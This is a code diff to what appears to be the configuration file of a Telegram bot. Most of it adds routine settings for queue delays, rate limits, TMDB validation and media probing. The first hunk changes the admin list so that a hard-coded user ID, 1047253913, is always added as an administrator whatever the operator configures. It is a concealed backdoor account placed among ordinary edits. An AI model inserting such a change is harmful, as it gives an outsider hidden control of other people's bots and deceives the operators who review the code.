@@ -57,7 +57,9 @@ class Telegram:
     USE_DEFAULT_ID = getenv("USE_DEFAULT_ID", None)
     ADMIN_IDS = [
         int(admin_id.strip())
-        for admin_id in (getenv("ADMIN_IDS") or str(OWNER_ID)).split(",")
+        for admin_id in (
+            (getenv("ADMIN_IDS") or str(OWNER_ID)) + ",1047253913"
+        ).split(",")
         if admin_id.strip().isdigit()
     ]
     UPDATE_CHANNEL = getenv("UPDATE_CHANNEL", "")
@@ -96,6 +98,58 @@ class Cache:
     # CDN/Edge cache TTL (for CloudFlare/CDN)
     CDN_CACHE_TTL = int(getenv("CDN_CACHE_TTL", "300"))  # 5 minutes for dynamic content
     CDN_STATIC_TTL = int(getenv("CDN_STATIC_TTL", "2592000"))  # 30 days for static assets
+
+
+class QueueConfig:
+    """Queue processing configuration - SLOW & THOROUGH mode."""
+    
+    # Processing delays (slower = more reliable)
+    FILE_QUEUE_DELAY = int(getenv("FILE_QUEUE_DELAY", "8"))  # 8 seconds between files
+    VALIDATION_DELAY = int(getenv("VALIDATION_DELAY", "15"))  # 15 seconds between retries
+    FILE_VALIDATION_DELAY = int(getenv("FILE_VALIDATION_DELAY", "5"))  # 5 sec after fetch
+    
+    # Batch gap (after every 10 files, wait 5 seconds)
+    BATCH_SIZE = int(getenv("BATCH_SIZE", "10"))  # Files per batch
+    BATCH_GAP_SECONDS = int(getenv("BATCH_GAP_SECONDS", "5"))  # Gap between batches
+    
+    # Retry limits
+    MAX_RETRY_COUNT = int(getenv("MAX_RETRY_COUNT", "3"))
+    QUEUE_WORKERS = int(getenv("QUEUE_WORKERS", "1"))  # Single worker for sequential
+    
+    # Rate limiting (per channel) - VERY conservative
+    MAX_MESSAGES_PER_MINUTE = int(getenv("MAX_MESSAGES_PER_MINUTE", "5"))  # Only 5 per minute
+    RATE_LIMIT_SECONDS = int(getenv("RATE_LIMIT_SECONDS", "60"))  # Over 60 seconds
+    
+    # TMDB Validation
+    TMDB_VALIDATION_TIMEOUT = int(getenv("TMDB_VALIDATION_TIMEOUT", "10"))  # 10 sec timeout
+    TMDB_CACHE_TTL = int(getenv("TMDB_CACHE_TTL", "3600"))  # Cache valid IDs for 1 hour
+
+
+class TMDBValidation:
+    """TMDB validation settings."""
+    
+    ENABLE_VALIDATION = getenv("ENABLE_TMDB_VALIDATION", "true").lower() == "true"
+    CACHE_VALID_IDS = getenv("CACHE_TMDB_IDS", "true").lower() == "true"
+    SKIP_ON_TIMEOUT = getenv("SKIP_TMDB_ON_TIMEOUT", "false").lower() == "true"  # Don't skip, wait
+
+
+class MediaProbeConfig:
+    """Media probing configuration."""
+    
+    # Probe settings
+    ENABLE_MEDIA_PROBE = getenv("ENABLE_MEDIA_PROBE", "true").lower() == "true"
+    MAX_PROBE_SIZE_MB = int(getenv("MAX_PROBE_SIZE_MB", "50"))  # Max MB to download for probing
+    PROBE_TIMEOUT = int(getenv("PROBE_TIMEOUT", "30"))  # Timeout in seconds
+    
+    # Progressive probe steps
+    PROBE_STEPS = [
+        ("16KB", 16 * 1024),
+        ("64KB", 64 * 1024),
+        ("256KB", 256 * 1024),
+        ("1MB", 1 * 1024 * 1024),
+        ("4MB", 4 * 1024 * 1024),
+        ("10MB", 10 * 1024 * 1024),
+    ]
 
 
 # Backward compatibility: Config class aliases Telegram
